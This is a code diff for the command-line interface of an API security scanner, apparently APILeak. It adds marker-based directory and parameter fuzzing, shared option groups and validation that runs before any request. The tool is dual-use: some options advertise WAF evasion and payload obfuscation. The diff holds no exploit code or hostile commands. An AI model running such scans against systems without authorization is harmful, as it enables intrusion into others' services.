-              help='Exclude results whose response word count satisfies EXPR. Repeatable.')
-@click.option('--filter-lines', 'filter_lines', multiple=True, metavar='EXPR',
-              help='Exclude results whose response line count satisfies EXPR. Repeatable.')
-@click.option('--filter-regex', 'filter_regex', multiple=True, metavar='REGEX',
-              help='Exclude results whose response body matches the regular expression REGEX. Repeatable.')
-@click.option('--filter-time', 'filter_time', multiple=True, metavar='EXPR',
-              help='Exclude results whose response time (seconds) satisfies EXPR. Repeatable.')
+@matcher_filter_options
 @click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection during directory fuzzing')
 @click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing during directory discovery')
 @click.option('--save-session', 'save_session', type=click.Path(), help='Save discovery results to a JSON session file (source of truth for reload)')
@@ -1044,8 +1451,7 @@ def cli(ctx, no_banner):
 @click.option('--resume', 'resume', type=click.Path(), help='Resume an interrupted discovery run from the discovery checkpoint at PATH (loaded before discovery; combine with --checkpoint to keep checkpointing)')
 @click.option('--export', 'export_format', type=click.Choice(['md', 'txt']), help='Write a human-readable discovery export in the selected format (md or txt)')
 @click.option('--export-file', 'export_file', type=click.Path(), help='Destination path for the human-readable export (extension selects the format)')
-@click.option('--output-format', 'output_format', type=click.Choice(['csv', 'jsonl']), help='Write a machine-readable discovery output in the selected format (csv or jsonl)')
-@click.option('--output-file', 'output_file', type=click.Path(), help='Destination path for the machine-readable output (extension selects the format)')
+@machine_output_options
 @click.option('--interactive', '--triage', 'interactive', is_flag=True, help='Enable interactive triage mode (opt-in; auto-disabled in CI mode)')
 @click.option('--scan-scope', 'scan_scope', metavar='SCOPE', default=None,
               help='Non-interactively define a Batch_Scan_Scope as all discovered records of a '
@@ -1055,17 +1461,10 @@ def cli(ctx, no_banner):
 @click.option('--ci-mode', 'ci_mode', is_flag=True, help='Enable CI mode (disables the interactive triage prompt so it never blocks a pipeline)')
 @click.option('--proxy', help='Route all HTTP traffic through an intercepting proxy (e.g. Burp/Caido/Hetty: http://127.0.0.1:8080). TLS verification is disabled by default for proxied HTTPS targets. SOCKS5 proxies with auth are supported, e.g. socks5://user:pass@host:port.')
 @click.option('--proxy-verify-ssl', 'proxy_verify_ssl', is_flag=True, help='Keep TLS certificate verification enabled when using --proxy (use after installing the proxy CA).')
-@click.option('--client-cert', 'client_cert', metavar='PATH[:KEY]', default=None, callback=_validate_client_cert,
-              help='Client certificate for mutual TLS, presented on every discovery request. '
-                   'A combined cert+key PEM PATH, or a cert:key pair of paths.')
-@click.option('--ca-bundle', 'ca_bundle', metavar='PATH', default=None, callback=_validate_ca_bundle,
-              help='Custom CA bundle used to verify target certificates for every discovery request.')
+@tls_options
 @click.option('--allow-cross-domain-redirects', 'allow_cross_domain_redirects', is_flag=True, default=False,
               help='Follow redirects to other domains during discovery. By default discovery '
                    'follows redirects only to the same domain as the originating request.')
-@click.option('--resolve', 'resolve', metavar='host:ip', default=None, callback=_validate_resolve,
-              help='Override DNS resolution for the named host to the supplied IP for every '
-                   'discovery request (e.g. api.example.com:127.0.0.1).')
 @click.option('--detect-secrets', 'detect_secrets', is_flag=True, default=False,
               help='Scan each discovery response body and headers for secrets/leaked '
                    'credentials (read-only; default: off). Matched values are redacted.')
@@ -1096,7 +1495,7 @@ def cli(ctx, no_banner):
                    "list of endpoint types like 'admin,api_version'. Only narrows the default "
                    'recursion; never relaxes it.')
 @click.pass_context
-def dir(ctx, target, wordlist, openapi, postman, output, log_level, log_file, json_logs, rate_limit, methods, depth, recursive, max_requests, concurrency, confirm_hits, timeout, retries, extensions, user_agent_random, user_agent_custom, user_agent_file, jwt, header, cookie, basic_auth, enumerate_methods, graphql, response, status_code, match_size, match_words, match_lines, match_regex, match_time, filter_size, filter_words, filter_lines, filter_regex, filter_time, detect_framework, fuzz_versions, save_session, load_session, checkpoint, resume, export_format, export_file, output_format, output_file, interactive, scan_scope, ci_mode, proxy, proxy_verify_ssl, client_cert, ca_bundle, allow_cross_domain_redirects, resolve, detect_secrets, secret_patterns, include_path, exclude_path, include_status, exclude_status, recursion_status, recursion_type):
+def dir(ctx, target, wordlist, openapi, postman, output, log_level, log_file, json_logs, rate_limit, methods, fuzz_keyword, fuzz_mode, depth, recursive, max_requests, concurrency, confirm_hits, timeout, retries, extensions, user_agent_random, user_agent_custom, user_agent_file, jwt, header, cookie, basic_auth, enumerate_methods, graphql, response, status_code, match_size, match_words, match_lines, match_regex, match_time, filter_size, filter_words, filter_lines, filter_regex, filter_time, detect_framework, fuzz_versions, save_session, load_session, checkpoint, resume, export_format, export_file, output_format, output_file, interactive, scan_scope, ci_mode, proxy, proxy_verify_ssl, client_cert, ca_bundle, allow_cross_domain_redirects, resolve, detect_secrets, secret_patterns, include_path, exclude_path, include_status, exclude_status, recursion_status, recursion_type):
     """Directory/endpoint fuzzing - discover hidden endpoints and directories
     
     \b
@@ -1123,7 +1522,7 @@ def dir(ctx, target, wordlist, openapi, postman, output, log_level, log_file, js
     setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
     logger = get_logger("dir")
     
-    logger.info("APILeak directory fuzzing starting", version="0.1.0", target=target)
+    logger.info("APILeak directory fuzzing starting", version="0.2.0", target=target)
 
     # Build --match-*/--filter-* expressions into the '<attribute>:<expression>'
     # grammar understood by parse_selectors. Status matching continues to use the
@@ -1185,6 +1584,82 @@ def dir(ctx, target, wordlist, openapi, postman, output, log_level, log_file, js
             logger.error("Invalid scan scope value", error=str(exc))
             click.echo(f"Error: {exc}", err=True)
             sys.exit(1)
+
+    # Marker-mode validation (Requirement 46), strictly exit-before-discovery
+    # (Requirement 46.7): the keyword, marker presence (for marker-only mode),
+    # fuzz-mode, wordlist/marker counts, empty pitchfork lists, and wordlist
+    # readability are all validated here BEFORE any Discovery_Request. Each
+    # failure prints a descriptive, value-naming error and exits non-zero with
+    # zero requests issued, mirroring the other exit-before-discovery blocks.
+    #
+    # A "marker-only option" is one that only makes sense in marker mode:
+    # --fuzz-keyword or --fuzz-mode supplied explicitly on the command line. When
+    # such an option is set but the target contains no Fuzz_Marker, that is a
+    # configuration error (Requirements 39.6, 46.2). When neither is supplied and
+    # the target has no keyword, find_markers returns [] and discovery uses the
+    # unchanged legacy base-path append path (Requirement 39.3).
+    marker_only_requested = (
+        ctx.get_parameter_source('fuzz_keyword')
+        == click.core.ParameterSource.COMMANDLINE
+        or ctx.get_parameter_source('fuzz_mode')
+        == click.core.ParameterSource.COMMANDLINE
+    )
+    marker_wordlists = None
+    try:
+        # 1. Keyword validity (Requirements 46.1, 39.5).
+        resolved_fuzz_keyword = validate_fuzz_keyword(fuzz_keyword)
+
+        # 2. Marker presence for marker-only mode (Requirements 46.2, 39.6).
+        markers = find_markers(target, resolved_fuzz_keyword)
+        if not markers and marker_only_requested:
+            raise ValueError(
+                "no Fuzz_Marker found in target URL "
+                f"{target!r} for keyword {resolved_fuzz_keyword!r}"
+            )
+
+        # 3. Fuzz-mode selection (Requirement 46.5). --fuzz-mode is a click.Choice
+        #    so an unrecognized value is rejected at parse time; parse_fuzz_mode
+        #    provides the same guard and yields the resolved FuzzMode.
+        resolved_fuzz_mode = parse_fuzz_mode(fuzz_mode)
+
+        if markers:
+            # 4. Associate the repeatable --wordlist sources with markers in
+            #    left-to-right order (Requirement 44.1); too many wordlists vs.
+            #    markers raises a mismatch error naming both counts
+            #    (Requirements 44.4, 46.3). Each source is wrapped so the helper's
+            #    count-check and fallback (reuse the last supplied source for any
+            #    remaining marker) operate on source references rather than
+            #    exploding the path string into characters.
+            wordlist_sources = [[src] for src in wordlist]
+            associated_sources = associate_wordlists(markers, wordlist_sources)
+
+            # 5. Load each associated wordlist via the existing loader; an
+            #    unreadable source is surfaced as a descriptive error
+            #    (Requirement 44.6).
+            marker_wordlists = []
+            for assoc in associated_sources:
+                source = assoc[0]
+                try:
+                    marker_wordlists.append(_read_wordlist_entries(source))
+                except OSError as exc:
+                    raise ValueError(
+                        f"unreadable wordlist source '{source}': {exc}"
+                    ) from exc
+
+            # In Pitchfork_Mode every required Marker_Wordlist must be non-empty
+            # (Requirements 44.5, 46.4).
+            if resolved_fuzz_mode == FuzzMode.PITCHFORK:
+                for marker, entries in zip(markers, marker_wordlists):
+                    if not entries:
+                        raise ValueError(
+                            "Pitchfork_Mode requires a non-empty wordlist for "
+                            f"every marker; the wordlist for marker at order "
+                            f"{marker.order} is empty"
+                        )
+    except ValueError as exc:
+        logger.error("Invalid marker-mode configuration", error=str(exc))
+        click.echo(f"Error: {exc}", err=True)
+        sys.exit(1)
 
     # Resolve the discovery candidate set from any Spec_Import sources and the
     # (repeatable, optionally stdin) wordlists before any discovery runs. An
@@ -1249,6 +1724,9 @@ def dir(ctx, target, wordlist, openapi, postman, output, log_level, log_file, js
             output=output,
             rate_limit=rate_limit,
             methods=methods,
+            fuzz_keyword=resolved_fuzz_keyword,
+            fuzz_mode=resolved_fuzz_mode.value,
+            marker_wordlists=marker_wordlists,
             user_agent_random=user_agent_random,
             user_agent_custom=user_agent_custom,
             user_agent_file=user_agent_file,
@@ -1362,6 +1840,15 @@ def dir(ctx, target, wordlist, openapi, postman, output, log_level, log_file, js
         # and accepts either a dict or a HitConfirmationConfig.
         if confirm_hits is not None:
             config_dict['fuzzing']['hit_confirmation'] = {'enabled': True, 'count': confirm_hits}
+        # Thread the resolved marker-mode selection into the fuzzing config
+        # (Requirements 39.1, 43.1). When the target has no keyword, find_markers
+        # returned [] above and marker_wordlists is None, so the EndpointFuzzer
+        # precomputes no markers and discovery uses the unchanged legacy path
+        # (Requirement 39.3). The keyword/mode are still recorded so the fuzzer
+        # can precompute markers once from the raw target.
+        config_dict['fuzzing']['endpoints']['fuzz_keyword'] = resolved_fuzz_keyword
+        config_dict['fuzzing']['endpoints']['fuzz_mode'] = resolved_fuzz_mode.value
+        config_dict['fuzzing']['endpoints']['marker_wordlists'] = marker_wordlists
         # Thread the storage-time Path_Scope and Storage_Status_Selection onto
         # the fuzzing config so the EndpointFuzzer applies them at storage time
         # (Requirements 33.1-33.7). _build_fuzzing_config reads these keys and
@@ -1679,6 +2166,9 @@ def _run_dir_triage(
     output,
     rate_limit,
     methods,
+    fuzz_keyword="FUZZ",
+    fuzz_mode="clusterbomb",
+    marker_wordlists=None,
     user_agent_random,
     user_agent_custom,
     user_agent_file,
@@ -1811,6 +2301,12 @@ def _run_dir_triage(
                 config_dict['fuzzing']['endpoints']['methods'] = [
                     m.strip() for m in methods.split(',')
                 ]
+            # Thread the resolved marker-mode selection into the triage discovery
+            # config exactly like the standard dir path (Requirements 39.1, 43.1,
+            # 39.3). marker_wordlists is None when the target has no keyword.
+            config_dict['fuzzing']['endpoints']['fuzz_keyword'] = fuzz_keyword
+            config_dict['fuzzing']['endpoints']['fuzz_mode'] = fuzz_mode
+            config_dict['fuzzing']['endpoints']['marker_wordlists'] = marker_wordlists
             if jwt:
                 config_dict['authentication']['contexts'][0]['token'] = jwt
                 config_dict['authentication']['contexts'][0]['type'] = 'bearer'
@@ -2498,14 +2994,18 @@ def _run_scoped_owasp_scan(
 
 @cli.command()
 @click.option('--target', '-t', required=True, help='Target URL to scan')
-@click.option('--wordlist', '-w', help='Wordlist file for parameter fuzzing')
+@click.option('--wordlist', '-w', 'wordlist', multiple=True,
+              help='Wordlist file of candidate parameter names for parameter '
+                   'fuzzing. Repeatable; merged and de-duplicated across all '
+                   'values. Use "-" to read entries from stdin. Defaults to '
+                   'wordlists/parameters.txt when omitted.')
 @click.option('--output', '-o', help='Output filename for reports (files will be saved in reports/ directory)')
 @click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']), 
               default='WARNING', help='Logging level')
 @click.option('--log-file', help='Log file path (optional)')
 @click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
 @click.option('--rate-limit', type=int, help='Requests per second limit')
-@click.option('--methods', default='GET,POST', 
+@click.option('--methods', default='GET,POST', callback=_validate_methods,
               help='HTTP methods to test (comma-separated)')
 @click.option('--user-agent-random', is_flag=True, help='Use random User-Agent headers to evade WAF')
 @click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
@@ -2516,8 +3016,28 @@ def _run_scoped_owasp_scan(
 @click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection during parameter fuzzing')
 @click.option('--proxy', help='Route all HTTP traffic through an intercepting proxy (e.g. Burp/Caido/Hetty: http://127.0.0.1:8080). TLS verification is disabled by default for proxied HTTPS targets.')
 @click.option('--proxy-verify-ssl', 'proxy_verify_ssl', is_flag=True, help='Keep TLS certificate verification enabled when using --proxy (use after installing the proxy CA).')
+@click.option('--fuzz-keyword', 'fuzz_keyword', default='FUZZ', show_default=True,
+              metavar='KEYWORD',
+              help='Literal token in the target URL marking positions to fuzz. '
+                   'When present, par runs in Marker_Mode and the repeatable '
+                   '--wordlist values are the per-marker wordlists in marker order.')
+@click.option('--fuzz-mode', 'fuzz_mode',
+              type=click.Choice(['clusterbomb', 'pitchfork'], case_sensitive=False),
+              default='clusterbomb', show_default=True,
+              help='Combination strategy for multiple markers (Marker_Mode).')
+@concurrency_options
+@click.option('--confirm-hits', 'confirm_hits', type=int, default=None, callback=_validate_confirm_hits,
+              metavar='N',
+              help='Enable Hit_Confirmation: re-request each interesting candidate N times '
+                   'and record it only when the responses are consistent (must be >= 1; '
+                   'default: off).')
+@resilience_options
+@request_context_options
+@matcher_filter_options
+@machine_output_options
+@tls_options
 @click.pass_context
-def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limit, methods, user_agent_random, user_agent_custom, user_agent_file, jwt, response, status_code, detect_framework, proxy, proxy_verify_ssl):
+def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limit, methods, fuzz_keyword, fuzz_mode, user_agent_random, user_agent_custom, user_agent_file, jwt, response, status_code, detect_framework, proxy, proxy_verify_ssl, concurrency, confirm_hits, max_requests, timeout, retries, header, cookie, basic_auth, match_size, match_words, match_lines, match_regex, match_time, filter_size, filter_words, filter_lines, filter_regex, filter_time, output_format, output_file, client_cert, ca_bundle, resolve):
     """Parameter fuzzing - discover hidden parameters in API endpoints
     
     \b
@@ -2526,16 +3046,80 @@ def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limi
       python apileaks.py par --target URL --jwt TOKEN --wordlist params.txt
       python apileaks.py par --target URL --user-agent-random --rate-limit 3
     """
-    
+
+    # Legacy `par` option audit (Requirements 2.5, 2.6).
+    #
+    # Every legacy `par` option present before the `dir`-parity work is RETAINED
+    # here with its original semantics (R2.5): --target, --wordlist (now also
+    # repeatable, backward-compatible with a single value), --output, --log-level,
+    # --log-file, --json-logs, --rate-limit, --methods, --user-agent-random/
+    # --user-agent-custom/--user-agent-file, --jwt, --response, --status-code,
+    # --detect-framework/--df, --proxy, and --proxy-verify-ssl are all accepted
+    # without terminating execution. The parity options added by tasks 11.1-11.5
+    # (request-context, resilience, concurrency, TLS, matcher/filter,
+    # machine-output, --confirm-hits) are purely ADDITIVE and each mirrors the
+    # option `dir` already exposes, so no legacy single-purpose flag was replaced
+    # or superseded. `--methods` was previously accepted but ignored ("not used");
+    # it is now wired to real injection-point semantics (R6), an enhancement of a
+    # retained option rather than a deprecation.
+    #
+    # Consequently there are NO deprecated `par` options: no deprecation notice is
+    # emitted because none is warranted (R2.6 is conditional on a deprecated
+    # option existing). Should a `par` option ever be superseded in future, emit a
+    # non-terminating notice via `_emit_deprecation_notice(<option>, <replacement>)`
+    # (the same helper `full`/`main` use), which writes to stderr and leaves
+    # stdout and the exit code unchanged.
+
     # Validate user agent options
     validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
-    
+
+    # Validate basic-auth conflicts/format before any parameter fuzzing runs so a
+    # --basic-auth + --jwt conflict (Requirement 7.7) or a colon-less value
+    # (Requirement 7.6) exits before any request is issued, identical to `dir`.
+    validate_basic_auth_options(basic_auth, jwt)
+
+    # Validate custom-header format before any parameter fuzzing runs so a
+    # colon-less --header value (Requirement 7.5) is rejected with a descriptive
+    # error naming the malformed header and exits before any request is issued.
+    validate_header_options(header)
+
     # Setup logging
     setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
     logger = get_logger("par")
     
-    logger.info("APILeak parameter fuzzing starting", version="0.1.0", target=target)
-    
+    logger.info("APILeak parameter fuzzing starting", version="0.2.0", target=target)
+
+    # Build --match-*/--filter-* expressions into the '<attribute>:<expression>'
+    # grammar understood by parse_selectors, reusing `dir`'s selector plumbing
+    # verbatim (Requirement 12.7). Status matching continues to use the existing
+    # --status-code flag, so it is intentionally not included here.
+    match_exprs = (
+        [f"size:{expr}" for expr in match_size]
+        + [f"words:{expr}" for expr in match_words]
+        + [f"lines:{expr}" for expr in match_lines]
+        + [f"regex:{expr}" for expr in match_regex]
+        + [f"time:{expr}" for expr in match_time]
+    )
+    filter_exprs = (
+        [f"size:{expr}" for expr in filter_size]
+        + [f"words:{expr}" for expr in filter_words]
+        + [f"lines:{expr}" for expr in filter_lines]
+        + [f"regex:{expr}" for expr in filter_regex]
+        + [f"time:{expr}" for expr in filter_time]
+    )
+
+    # Parse selectors at CLI parse time so a syntactically invalid matcher/filter
+    # expression is surfaced as a descriptive CLI error and NO parameter fuzzing
+    # request is issued (Requirement 12.4), consistent with `dir`. The parsed
+    # matchers/filters are threaded into the finding-selection pipeline by a
+    # later task; parsing here guarantees the exit-before-request behavior.
+    try:
+        matchers, filters = parse_selectors(match_exprs, filter_exprs)
+    except SelectorError as exc:
+        logger.error("Invalid response selector expression", error=str(exc))
+        click.echo(f"Error: {exc}", err=True)
+        sys.exit(1)
+
     try:
         # Prepare user agent configuration
         user_agent_config = None
@@ -2559,22 +3143,183 @@ def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limi
         
         # Parse status code filter for HTTP output
         status_code_filter = parse_status_codes(status_code) if status_code else None
-        
-        # Create default configuration for parameter fuzzing
-        config_dict = create_default_config(target, wordlist, "par", user_agent_config, output_filename, advanced_config, status_code_filter)
+
+        # Parse operator-supplied request-context headers, cookie, and basic-auth
+        # reusing `dir`'s helpers verbatim (Requirements 7.1-7.3). The cookie is
+        # carried as a 'Cookie' header so it rides the same custom_headers path as
+        # --header (Requirement 7.2).
+        extra_headers = parse_header_options(header)
+        if cookie:
+            extra_headers['Cookie'] = cookie
+        basic_auth_creds = parse_basic_auth(basic_auth)
+
+        # ------------------------------------------------------------------ #
+        # Marker-mode validation (Requirements 1.5, 1.6, 2.3, 5.1, 7.4,   #
+        # 7.5, 7.6, 10.1–10.7), strictly exit-before-request.              #
+        # Mirrors the dir command marker-validation block verbatim but      #
+        # threads into config_dict['fuzzing']['parameters'].                #
+        # ------------------------------------------------------------------ #
+        marker_only_requested = (
+            ctx.get_parameter_source('fuzz_keyword')
+            == click.core.ParameterSource.COMMANDLINE
+            or ctx.get_parameter_source('fuzz_mode')
+            == click.core.ParameterSource.COMMANDLINE
+        )
+        marker_wordlists = None
+        try:
+            # 1. Keyword validity (R1.5 / R10.1).
+            resolved_fuzz_keyword = validate_fuzz_keyword(fuzz_keyword)
+
+            # 2. Marker presence for marker-only mode (R1.6 / R10.2).
+            markers = find_markers(target, resolved_fuzz_keyword)
+            if not markers and marker_only_requested:
+                raise ValueError(
+                    "no Fuzz_Marker found in target URL "
+                    f"{target!r} for keyword {resolved_fuzz_keyword!r}"
+                )
+
+            # 3. Fuzz-mode selection (R5.1 / R10.3).
+            resolved_fuzz_mode = parse_fuzz_mode(fuzz_mode)
+
+            if markers:
+                # 4. Associate wordlists with markers in left-to-right order
+                #    (R7.1–R7.4 / R10.4). Each --wordlist source is wrapped so
+                #    associate_wordlists operates on source references.
+                wordlist_sources = [[src] for src in wordlist]
+                if not wordlist_sources:
+                    # R7.7: no --wordlist supplied → default parameter wordlist
+                    # covers every marker position.
+                    wordlist_sources = [[DEFAULT_PARAMETER_WORDLIST]]
+                associated_sources = associate_wordlists(markers, wordlist_sources)
+
+                # 5. Read each associated wordlist (R7.6 / R10.6).
+                marker_wordlists = []
+                for assoc in associated_sources:
+                    source = assoc[0]
+                    try:
+                        marker_wordlists.append(_read_wordlist_entries(source))
+                    except OSError as exc:
+                        raise ValueError(
+                            f"unreadable wordlist source '{source}': {exc}"
+                        ) from exc
+
+                # 6. Pitchfork empty-wordlist check (R7.5 / R10.5).
+                if resolved_fuzz_mode == FuzzMode.PITCHFORK:
+                    for marker, entries in zip(markers, marker_wordlists):
+                        if not entries:
+                            raise ValueError(
+                                "Pitchfork_Mode requires a non-empty wordlist for "
+                                "every marker; the wordlist for marker at order "
+                                f"{marker.order} is empty"
+                            )
+        except ValueError as exc:
+            logger.error("Invalid marker-mode configuration", error=str(exc))
+            click.echo(f"Error: {exc}", err=True)
+            sys.exit(1)
+
+        # In Name_Discovery_Mode (no markers, no marker-only option) resolve
+        # the merged, de-duplicated candidate parameter set from the repeatable
+        # --wordlist sources BEFORE any request.  This path is gated on
+        # marker_wordlists is None so Marker_Mode never runs it (R2.1).
+        candidate_parameters = None
+        if marker_wordlists is None:
+            # Resolve the merged, de-duplicated candidate parameter set from the
+            # repeatable --wordlist sources BEFORE any request, reusing `dir`'s
+            # wordlist-reading helper. An unreadable source is surfaced as a
+            # descriptive error naming the file and stops before any request
+            # (Requirement 10.3). When --wordlist is omitted the default
+            # wordlists/parameters.txt is used (Requirement 10.4).
+            try:
+                candidate_parameters = _resolve_par_candidates(wordlist)
+            except ValueError as exc:
+                logger.error("Unreadable parameter wordlist", error=str(exc))
+                click.echo(f"Error: {exc}", err=True)
+                sys.exit(1)
+
+            # An empty merged candidate set completes WITHOUT issuing any request
+            # and reports that no candidate parameters were available (R10.5).
+            if not candidate_parameters:
+                click.echo(
+                    "No candidate parameters available: no wordlist entries to fuzz."
+                )
+                return
+
+        # Create default configuration for parameter fuzzing. The wordlist file
+        # path is left at its default; the merged candidate set below overrides
+        # the file-based wordlists via query_candidates/body_candidates.
+        #
+        # The transversal transport/TLS options (--client-cert/--ca-bundle/
+        # --resolve) and the parameter-fuzzing controls (--methods, --confirm-hits,
+        # --max-requests, and the merged query/body candidate sets) are threaded
+        # THROUGH create_default_config so the `par` wiring is centralized in the
+        # config-creation path — mirroring how the transversal keys are
+        # centralized there — rather than being patched onto config_dict inline.
+        # The CLI validators have already parsed/validated each of these before
+        # any request is issued (Requirements 5.1, 6.1, 9.1-9.3, 10.1, 10.2, 11.1).
+        #
+        # In Marker_Mode: query_candidates/body_candidates are None (name-discovery
+        # path is skipped); fuzz_keyword, fuzz_mode, marker_wordlists are threaded.
+        # In Name_Discovery_Mode: marker_wordlists is None (marker gate stays off).
+        config_dict = create_default_config(
+            target, None, "par", user_agent_config, output_filename,
+            advanced_config, status_code_filter, extra_headers, basic_auth_creds,
+            client_cert=client_cert, ca_bundle=ca_bundle, resolve=resolve,
+            parameter_methods=methods, confirm_hits=confirm_hits,
+            parameter_max_requests=max_requests,
+            query_candidates=candidate_parameters,
+            body_candidates=candidate_parameters,
+            fuzz_keyword=resolved_fuzz_keyword,
+            fuzz_mode=resolved_fuzz_mode.value,
+            marker_wordlists=marker_wordlists,
+        )
         config_dict['proxy'] = proxy
         config_dict['proxy_verify_ssl'] = proxy_verify_ssl
-        
+
         # Apply CLI overrides
         if rate_limit:
             config_dict['rate_limiting']['requests_per_second'] = rate_limit
+        # Thread the per-request resilience and concurrency controls into the
+        # config exactly as `dir` does (Requirement 8). --timeout becomes the
+        # target read timeout (8.1), --retries becomes the RetryConfig source
+        # (8.2), and --concurrency limits in-flight requests (8.3). Each falls
+        # back to the config defaults when not supplied (8.6). These stay inline
+        # here (as they do in `dir`) since they are shared fuzzing/target keys,
+        # not part of the centralized par-path threading above.
+        if timeout is not None:
+            config_dict['target']['timeout'] = timeout
+        if retries is not None:
+            config_dict['fuzzing']['retries'] = retries
+        if concurrency is not None:
+            config_dict['fuzzing']['concurrency'] = concurrency
         if jwt:
             config_dict['authentication']['contexts'][0]['token'] = jwt
             config_dict['authentication']['contexts'][0]['type'] = 'bearer'
         if response:
             config_dict['fuzzing']['response_filter'] = parse_response_codes(response)
-        # Note: methods parameter is not used for parameter fuzzing as it's handled differently
-        
+
+        # Thread the parsed response matchers/filters into the shared FuzzingConfig
+        # fields so parameter findings are narrowed by the SAME matcher-before-filter
+        # pipeline `dir` uses: retain only findings satisfying every matcher, then
+        # exclude any finding satisfying any filter (Requirements 12.1-12.3). The
+        # selectors were already parsed above at CLI time (exit-before-request on an
+        # invalid expression, Requirement 12.4); here they flow through to the
+        # engine's finding-selection step. When no selectors were supplied both
+        # lists are empty and selection is a no-op.
+        config_dict['fuzzing']['matchers'] = matchers
+        config_dict['fuzzing']['filters'] = filters
+
+        # Thread the machine-readable output selections (--output-format/
+        # --output-file) into the shared FuzzingConfig so the engine writes the
+        # selected parameter findings (including their detection-signal fields)
+        # through the same CSV/JSON Lines machine writer `dir` uses
+        # (Requirements 12.5, 12.6). --output-format is already constrained to
+        # csv/jsonl by click.Choice at parse time, so an unsupported format is
+        # rejected before any request and no file is written (Requirement 12.6).
+        # When neither option is supplied both stay None and no machine output
+        # is written, leaving the default report behavior unchanged.
+        config_dict['fuzzing']['output_format'] = output_format
+        config_dict['fuzzing']['output_file'] = output_file
+
         # Load configuration through ConfigurationManager
         config_manager = ConfigurationManager()
         apileak_config = config_manager.load_config_from_dict(config_dict)
@@ -2596,233 +3341,949 @@ def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limi
         sys.exit(1)
 
 
-@cli.command()
-@click.option('--config', '-c', type=click.Path(exists=True), 
-              help='Configuration file path (YAML or JSON) - optional')
-@click.option('--target', '-t', help='Target URL to scan (overrides config)')
-@click.option('--output', '-o', help='Output filename for reports (files will be saved in reports/ directory)')
-@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']), 
-              default='WARNING', help='Logging level')
-@click.option('--log-file', help='Log file path (optional)')
-@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
-@click.option('--modules', help='Comma-separated list of OWASP modules to enable')
-@click.option('--rate-limit', type=int, help='Requests per second limit')
-@click.option('--depth', 'depth', type=int, default=None, callback=_validate_depth,
-              help='Max recursion depth for discovery (0 = no recursion). '
-                   'Overrides APILEAK_MAX_DEPTH and the config default (3).')
-@click.option('--recursive/--no-recursive', 'recursive', default=None,
-              help='Enable or disable recursive discovery (default: enabled).')
-@click.option('--max-requests', 'max_requests', type=int, default=None, callback=_validate_max_requests,
-              help='Global request budget for discovery (default: unbounded).')
-@click.option('--concurrency', 'concurrency', type=int, default=None, callback=_validate_concurrency,
-              help='Max concurrent in-flight discovery requests (default: 50).')
-@click.option('--timeout', 'timeout', type=float, default=None, callback=_validate_timeout,
-              help='Per-request timeout in seconds applied to every discovery request '
-                   '(must be > 0; default: 10).')
-@click.option('--retries', 'retries', type=int, default=None, callback=_validate_retries,
-              help='Number of automatic retries for each failed discovery request '
-                   '(must be >= 0; default: 2).')
-@click.option('--extensions', '-x', 'extensions', multiple=True, metavar='EXT',
-              help='File extensions to append to each wordlist entry (comma-separated, repeatable). '
-                   'e.g. -x json,php or -x .json -x .php. Leading dots are optional.')
-@click.option('--user-agent-random', is_flag=True, help='Use random User-Agent headers to evade WAF')
-@click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
-@click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
-@click.option('--jwt', help='JWT token to use for authentication')
-@click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
-@click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection (FastAPI, Express, Django, Flask, etc.)')
-@click.option('--fuzz-versions', '--fv', is_flag=True, help='Enable API version fuzzing (/v1, /v2, /api/v1, etc.)')
-@click.option('--framework-confidence', type=float, default=0.6, help='Minimum confidence threshold for framework detection (0.0-1.0)')
-@click.option('--version-patterns', help='Custom version patterns for fuzzing (comma-separated, e.g., /v1,/v2,/api/v1)')
-@click.option('--enable-advanced', is_flag=True, help='Enable all advanced features (framework detection, version fuzzing, subdomain discovery, CORS analysis)')
-@click.option('--enable-payload-encoding', is_flag=True, help='Enable advanced payload encoding and obfuscation techniques')
-@click.option('--enable-waf-evasion', is_flag=True, help='Enable WAF detection and evasion techniques')
-@click.option('--enable-subdomain-discovery', is_flag=True, help='Enable subdomain discovery and testing')
-@click.option('--enable-cors-analysis', is_flag=True, help='Enable CORS policy analysis and security headers testing')
-@click.option('--ci-mode', is_flag=True, help='Enable CI/CD mode with appropriate exit codes and artifact generation')
-@click.option('--fail-on', type=click.Choice(['critical', 'high', 'medium', 'low']), 
-              default='critical', help='Fail CI pipeline on findings of this severity or higher')
-@click.option('--sarif', is_flag=True, help='Generate a SARIF 2.1.0 report (for code scanning / CI integration)')
-@click.option('--safe-mode', is_flag=True, help='Enable Safe Mode: skip state-changing probes (POST/PUT/PATCH/DELETE) and restrict requests to safe methods (non-destructive scan)')
-@click.option('--baseline', type=click.Path(), help='Path to a baseline JSON report. Findings matching the baseline by (category, endpoint, method) are treated as known; only new findings drive the CI severity gate. A missing path treats every finding as new.')
-@click.option('--proxy', help='Route all HTTP traffic through an intercepting proxy (e.g. Burp/Caido/Hetty: http://127.0.0.1:8080). TLS verification is disabled by default for proxied HTTPS targets.')
-@click.option('--proxy-verify-ssl', 'proxy_verify_ssl', is_flag=True, help='Keep TLS certificate verification enabled when using --proxy (use after installing the proxy CA).')
-@click.option('--recursion-status', 'recursion_status', metavar='CLASSES', default=None,
-              help='Restrict recursion to endpoints whose status class is in CLASSES: a '
-                   "comma-separated list of status classes like '2xx,3xx'. Only narrows the "
-                   'default VALID/AUTH_REQUIRED recursion; never relaxes it.')
-@click.option('--recursion-type', 'recursion_type', metavar='TYPES', default=None,
